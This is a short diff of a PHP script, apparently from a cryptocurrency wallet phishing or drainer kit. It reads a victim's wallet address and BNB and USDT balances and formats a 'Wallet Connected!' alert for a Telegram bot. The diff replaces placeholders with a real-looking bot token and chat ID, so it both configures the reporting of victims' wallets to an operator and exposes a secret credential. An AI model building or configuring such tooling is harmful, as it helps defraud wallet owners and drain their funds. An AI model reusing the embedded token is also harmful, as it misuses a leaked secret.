@@ -5,8 +5,8 @@ $address = isset($data['wallet']) ? $data['wallet'] : 'Not Found';
 $bnb     = isset($data['bnb']) ? $data['bnb'] : '0';
 $usdt    = isset($data['usdt']) ? $data['usdt'] : '0';
 
-$token   = 'YOUR_BOT_TOKEN';
-$chat_id = 'YOUR_CHAT_ID';
+$token   = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
+$chat_id = '8191508290';
 
 $message = "📥 *Wallet Connected!*\n\n"
          . "👛 *Address:* `$address`\n"
